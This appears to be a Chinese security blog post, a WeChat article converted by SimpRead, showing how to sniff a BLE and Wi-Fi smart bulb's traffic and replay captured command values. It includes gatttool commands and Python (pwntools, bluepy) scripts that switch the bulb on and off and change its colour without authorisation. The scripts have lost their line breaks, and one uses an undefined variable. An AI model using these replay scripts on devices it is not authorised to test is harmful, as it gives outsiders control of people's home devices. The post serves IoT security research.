<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/eB0RnwUbYmQ0I_aYXbEPJg)

**前言**

随着 IOT 技术的普及，智能家居设备在家庭中使用的也越来越多，例如智能灯泡、扫地机器人、智能音箱等智能设备都可以由一些专门的 app 进行统一的联网接管管理。本篇文章将以一款基于低功耗蓝牙的智能灯泡为例，展示其中可能存在的一些网络安全风险问题以及一些常规的劫持攻击方法。

**实验准备**

  

**- 所需工具**

硬件工具：

NRF52832 Dongle

CSR8510 蓝牙适配器

软件工具：

wireshark

gatttool

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedib1FlqC9PwJLrjWTjibVtMsQAAeXibrHWbA2F2k6eiculhQRlBdeWDWHibQ/640?wx_fmt=png)

-**BLE** **监听环境**

cp2102 驱动下载：

https://www.silabs.com/developers/usb-to-uart-bridge-vcp-drivers

Whireshark 插件 nrf sniffer：

https://www.nordicsemi.com/Software-and-Tools/Development-Tools/nRF-Sniffer/Download#infotab

1.  1. 在 wireshark 中打开 “关于”->"文件夹"->"Global Extcap path" 将下载的 nrf sniffer 中的 extcap 中的文件复制于此。
    
2.  ![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedVMrlVMXDmjY5jPcicnXTBvoJkVxKr0c8MYE09NkZ2KOCmI13Dj2bU8Q/640?wx_fmt=png)
    
3.  2. 将 Profile_nRF_Sniffer_Bluetooth_LE 文件夹拷贝到 profiles 文件夹中，
    
4.  ![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedeKfPRK65L67w3GQL3wjC17iayprolJPZfh5v7NeXPoC3aYFic4TaKLOg/640?wx_fmt=png)
    
5.  随后在 “配置文件” 中设置新增的 nRF_Sniffer 配置文件。
    

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedDStVAebBy2iaVEWMgAiaqXnIxZUNiahp7uvLXmzhNJhZ3TvO2wuyuOpZg/640?wx_fmt=png)3. Python 安装 pyserial 库

pip install pyserial>=3.4

https://files.pythonhosted.org/packages/1e/7d/ae3f0a63f41e4d2f6cb66a5b57197850f919f59e558159a4dd3a818f5082/pyserial-3.5.tar.gz

1.  4.  最后可以再接口中看到 nRF Sniffer 的设备即完成 wireshark 的准备。
    

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPed0pictHKHYtticsPawr6XhH5HUbJCbbIBfGWPsayBWCmQyhcNDibficBJRg/640?wx_fmt=png)

**BLE 数据包分析**

  

1.  1.  接入 NRF52832 Dongle 后在上方 Device 中选择要监听的目标设备（需要 BLE 设备处于活动状态），再对蓝牙主从机建立连接，之后就可以在 CONNECT_IND 包中看到相对应的通信信道所使用的情况，以及 Bluetooth Attribute Protocol 中可以看到通信的关键部分，如 Opcode（具体的读写操作）、Handle（Characteristic，属性地址）、Value（数据值）。而本次分析的重点也在于 Bluetooth Attribute Protocol 协议层的会话传递过程。
    
2.  ![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedtGVYhLW1wMSK4EibMj9ZW3ObrgcUDXLq5sarCqw54Ku77XhO84m69Hw/640?wx_fmt=png)
    

2. 在 ble 设备与主机建立连接后便可以看到大量的数据包，会对需要重点关注的 BLE 相关会话分析造成很大影响，对此可以使用!(btle.length==0) 来过滤掉所有的空包，btatt 显示所有的 att 数据包。

3. 在使用过滤指令后，尝试通过手机控制灯泡的开关，这时在 Wireshark 中就可以看到一些 ATT 的数据包，在为加密的情况下，可以直观的看到相关信息中写着 “Sent Write Command…”。

4. 而这些数据包的 Bluetooth Attribute Protocol 中 Opcode 代表着具体的执行操作，可以是 write（cmd、req）、read（cmd、req）等操作。handle 为写入的地址属性标识，也代表着控制蓝牙灯泡时的主要需要操作的指令，如灯泡开关、颜色、亮度等。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedovYjStlVObCWuYQzrE8zmvqbNfh7TtVot7jBpHlm1KR7LG6wvCkV7w/640?wx_fmt=png)

2.  5.  通过多次发送开关请求分析可以发现在其中对应的 handle：0x0011 的 value 分别为下：
    

**000180000003040a715495** **开启灯光**

**000180000003040a712495** **关闭灯光**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedagWib2x4jjyDbHVDeqOiaHUQFFPg8Xh4k2sANcIQ54sPSNAuSBRpETUQ/640?wx_fmt=png)

2.  6.  在得到这样的数值并且知道其属于 service 0xffff 的句柄 ID 为 0x0011 后，便可以尝试对其句柄 value 进行写入操作，进行数据请求的重放，从而实现未授权的远程控制灯泡开关操作。这里使用 gatttool 工具对其进行写入测试。
    

- 通过 primary 查看相关的句柄属性。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedicBoS7yTEZoj8DEdcbcSnd9iaWjJeFn3LhBeP3SN00psSWFP0IicFmwrQ/640?wx_fmt=png)

- 使用 char-write-cmd 就可以直接向 0x0011 中写入数据。

```
> gatttool -b b4:e8:42:54:ba:ab -I
[b4:e8:42:54:ba:ab][LE]> connect
[b4:e8:42:54:ba:ab][LE]> char-write-cmd 0x0011 000180000003040a712495
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedAA8Iicoak6w1zZsQ6bpI6FsktpYnTBpkMYA21n6jLyaFoGHQ6vIUz4A/640?wx_fmt=png)

7. 并可以将过程编写为 python 脚本如下

```
#!/usr/bin/env python3# -*- coding: utf-8 -*-from pwn import *import sys#context.log_level = "debug"argv = ["gatttool","-b","b4:e8:42:54:ba:ab","-I"]sh = process(argv)sh.sendline("connect")sh.recvuntil("Connection successful")sh.recvuntil("[LE]> ")#value = "000180000003040a712495" #off#value = "000380000003040a712394" #onsh.sendline("char-write-cmd 0x0011 000180000000010c")sh.sendline("char-write-cmd 0x0011 00048000000e0f0ae00100a11e646400000000140000")#sh.sendline("char-write-cmd 0x0011 "+sys.argv[1])#for i in range(90):#    sh.sendline("char-write-cmd 0x0011 000180000003040a712495")#    sleep(2)#    sh.sendline("char-write-cmd 0x0011 000380000003040a712394")sh.interactive()
```

     也可以使用 python 的 bluepy 库进行编写

```
from bluepy.btle import *import timedef hackFlow(conn, address):    conn.waitForNotifications(2)    conn.writeCharacteristic(0x0004, "\x00\x04", True)    conn.writeCharacteristic(0x000f,"\x00\x01",True)    conn.waitForNotifications(2)    conn.writeCharacteristic(0x0011,"\x00\x01\x80\x00\x00\x02\x03\x01\x22\x22",True) if __name__ == '__main__':    devAddr = "b4:e8:42:54:ba:ab"    addrType = ADDR_TYPE_PUBLIC    time.sleep(1)    conn = Peripheral(devAddr, addrType)    try:        hackFlow(conn,devAddr)        print("vibering...")    finally:        print("disconnect...")        conn.disconnect()
```

**TCP 数据包分析**

由于该智能灯泡同时支持 wifi 接入，因此除了对 BLE 的分析外，还可以尝试分析其 TCP 协议上的会话过程。

  

同样是通过 wireshark 进行抓包分析，在手机端接入 PC 的网络后，使用 **eth.src == 14:7d:da:5b:xx:xx && eth.dst ==b4:e8:42:54:ba:aa** 进行过滤。

  

当使用手机开启灯光时可以直观的看到一条想 5577 端口请求的数据包，其中的 data 值为 **b0b1b2b30001022f000371239423**。 那么对应的这个值便是控制灯光开启的参数了。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedRs5XJgNBfE5xZq7crZb2P5sgHWpd71YXVicwQNqr5jSrp6EGu569KrA/640?wx_fmt=png)

使用同样的方法测试 APP 中的其他功能，例如控制变换其他颜色，抓取到的对应值如下：

```
on = "b0b1b2b30001022f000371239423" # onoff = "b0b1b2b30001024500037124953b"red = "b0b1b2b300010241000ee00100a10064640000000014000076" # redblue = "b0b1b2b30001024a000ee00100a178646400000000140000f7"green = "b0b1b2b30001024c000ee00100a13c646400000000140000bd"
```

最后编写 Python 脚本，就可以实现同一局域网下的未授权控制，控制灯光任意颜色或者开关。

```
from pwn import *context.log_level = "debug"sh= remote("192.168.31.177",5577)on = "b0b1b2b30001022f000371239423" # onoff = "b0b1b2b30001024500037124953b"red = "b0b1b2b300010241000ee00100a10064640000000014000076" # redblue = "b0b1b2b30001024a000ee00100a178646400000000140000f7"green = "b0b1b2b30001024c000ee00100a13c646400000000140000bd"payload = test.decode('hex')# payload = "\xb0\xb1\xb2\xb3\x00\x01\x02\x1e\x00\x03\x71\x23\x94\x12"sh.send(payload)sh.interactive()
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPed1OOPZIHz7N6w4EWCZQRyyQlI69mS72ChicktWH9CkXfagoCM7pZ4icoQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedGC8fPPibCoco5HomSiafA4pd5dDkhuicOJgpuqzjLXhchjQXcSIUmNiaGA/640?wx_fmt=png)

**END**